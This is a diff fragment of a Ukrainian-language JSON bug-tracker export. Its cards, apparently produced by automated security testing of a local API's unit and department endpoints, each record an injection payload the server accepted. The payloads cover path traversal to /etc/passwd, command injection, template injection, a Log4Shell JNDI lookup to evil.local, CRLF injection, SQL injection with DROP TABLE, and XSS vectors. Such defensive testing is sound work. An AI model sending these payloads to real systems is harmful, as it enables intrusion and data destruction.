+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 21 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ../../../../etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 138,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-139",
+      "name": "BR-139: Unit → SQL_XSS Create unit, ітерація 22: [Path Traversal] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 22 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ....//....//etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 139,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-140",
+      "name": "BR-140: Unit → SQL_XSS Create unit, ітерація 23: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 23 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ; ls -la`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 140,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-141",
+      "name": "BR-141: Unit → SQL_XSS Create unit, ітерація 24: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 24 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = | whoami`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 141,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-142",
+      "name": "BR-142: Unit → SQL_XSS Create unit, ітерація 25: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 25 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ${7*7}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 142,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-143",
+      "name": "BR-143: Unit → SQL_XSS Create unit, ітерація 26: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 26 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <%= 7*7 %>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 143,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-144",
+      "name": "BR-144: Unit → SQL_XSS Create unit, ітерація 27: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 27 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 144,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-145",
+      "name": "BR-145: Unit → SQL_XSS Create unit, ітерація 28: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 28 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 145,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-146",
+      "name": "BR-146: Unit → SQL_XSS Create unit, ітерація 29: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 29 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = admin%0d%0aSet-Cookie: x=1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 146,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-147",
+      "name": "BR-147: Unit → SQL_XSS Create unit, ітерація 30: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 30 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = test%0d%0aX-Injected: true`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 147,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-148",
+      "name": "BR-148: Unit → SQL_XSS Create unit, ітерація 31: [Null Byte] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 31 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = unit%00`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 148,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-149",
+      "name": "BR-149: Unit → SQL_XSS Create unit, ітерація 32: [Homoglyph] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 32 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = Unіt with Cyrillic look-alikes`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 149,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-150",
+      "name": "BR-150: Unit → SQL_XSS Create unit, ітерація 33: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 33 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 150,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-151",
+      "name": "BR-151: Unit → SQL_XSS Create unit, ітерація 34: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 34 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 151,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-152",
+      "name": "BR-152: Department → SQL_XSS Create department, ітерація 1: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 1 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 152,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-153",
+      "name": "BR-153: Department → SQL_XSS Create department, ітерація 2: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 2 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = admin'--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 153,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-154",
+      "name": "BR-154: Department → SQL_XSS Create department, ітерація 3: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 3 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = '; DROP TABLE Departments;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 154,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-155",
+      "name": "BR-155: Department → SQL_XSS Create department, ітерація 4: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 4 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 155,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-156",
+      "name": "BR-156: Department → SQL_XSS Create department, ітерація 5: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 5 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = <script>alert(1)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 156,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-157",
+      "name": "BR-157: Department → SQL_XSS Create department, ітерація 6: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 6 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 157,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-158",
+      "name": "BR-158: Department → SQL_XSS Create department, ітерація 7: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 7 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = <svg onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 158,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-159",
+      "name": "BR-159: Department → SQL_XSS Create department, ітерація 9: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 9 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 159,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-160",
+      "name": "BR-160: Department → SQL_XSS Create department, ітерація 10: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 10 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 160,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-161",
+      "name": "BR-161: Department → SQL_XSS Create department, ітерація 11: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 11 (Department → SQL_XSS Create department)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-11",
+      "pos": 161,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-162",
+      "name": "BR-162: Department → SQL_XSS Edit department, ітерація 1: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 1 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = ' OR '1'='1`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 162,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-163",
+      "name": "BR-163: Department → SQL_XSS Edit department, ітерація 2: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 2 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = admin'--`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 163,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-164",
+      "name": "BR-164: Department → SQL_XSS Edit department, ітерація 3: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 3 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = '; DROP TABLE Departments;--`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 164,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-165",
+      "name": "BR-165: Department → SQL_XSS Edit department, ітерація 4: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 4 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = ' OR '1'='1`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 165,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-166",
+      "name": "BR-166: Department → SQL_XSS Edit department, ітерація 5: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 5 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = <script>alert(1)</script>`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 166,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-167",
+      "name": "BR-167: Department → SQL_XSS Edit department, ітерація 6: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 6 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 167,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-168",
+      "name": "BR-168: Department → SQL_XSS Edit department, ітерація 7: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 7 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = <svg onload=alert(1)>`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 168,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-169",
+      "name": "BR-169: Department → SQL_XSS Edit department, ітерація 9: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 9 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 169,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-170",
+      "name": "BR-170: Department → SQL_XSS Edit department, ітерація 10: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 10 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 170,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-171",
+      "name": "BR-171: Department → SQL_XSS Edit department, ітерація 11: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 11 (Department → SQL_XSS Edit department)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`",
+      "idList": "list-12",
+      "pos": 171,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
           "color": "red"
         }
       ]
@@ -200,7 +2820,7 @@
       "color": "yellow"
     },
     {
-      "name": "security-critical",
+      "name": "security",
       "color": "red"
     }
   ]
